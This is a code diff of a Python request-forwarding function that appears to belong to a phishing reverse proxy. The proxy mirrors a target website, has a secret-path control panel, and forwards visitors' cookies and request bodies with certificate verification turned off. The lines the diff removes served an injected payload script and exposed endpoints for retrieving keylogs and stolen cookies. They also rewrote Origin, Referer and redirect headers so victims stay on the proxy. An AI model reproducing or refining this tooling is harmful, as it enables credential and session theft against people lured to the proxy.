@@ -213,25 +213,9 @@ def start_proxy(target, host, port, secret):
             filename = path[len(secret)+1:]
             return panel_files(filename)
 
-        if path == 'payload-script.js':
-            return serve_payload()
-
         try:
-            # Handle API endpoints
-            if path.startswith('ep/api/'):
-                if path == 'ep/api/getKeylog':
-                    return get_keylog()
-                elif path == 'ep/api/getCookies':
-                    return get_cookies()
-                # ... other API endpoints ...
-
             # Build target URL
-            target_url = f"https://{target}"
-            if path:
-                # Remove any duplicate slashes
-                clean_path = '/'.join(filter(None, path.split('/')))
-                target_url = f"{target_url}/{clean_path}"
-            
+            target_url = f"https://{target}/{path}"
             if request.query_string:
                 target_url += f"?{request.query_string.decode()}"
 
@@ -242,10 +226,6 @@ def start_proxy(target, host, port, secret):
             excluded_headers = ['host', 'content-length']
             headers = {k: v for k, v in headers.items() if k.lower() not in excluded_headers}
             headers['Host'] = target
-            if 'Origin' in headers:
-                headers['Origin'] = f"https://{target}"
-            if 'Referer' in headers:
-                headers['Referer'] = f"https://{target}/"
 
             # Forward the request
             resp = session.request(
@@ -254,20 +234,10 @@ def start_proxy(target, host, port, secret):
                 headers=headers,
                 data=request.get_data(),
                 cookies=request.cookies,
-                allow_redirects=False,
+                allow_redirects=True,
                 verify=False,
                 timeout=30
             )
-
-            # Handle redirects
-            if resp.status_code in [301, 302, 303, 307, 308]:
-                location = resp.headers.get('Location', '')
-                if location.startswith('http'):
-                    parsed = urllib.parse.urlparse(location)
-                    location = parsed.path
-                    if parsed.query:
-                        location += f"?{parsed.query}"
-                return Response('', resp.status_code, {'Location': location})
 
             # Process response
             content = resp.content
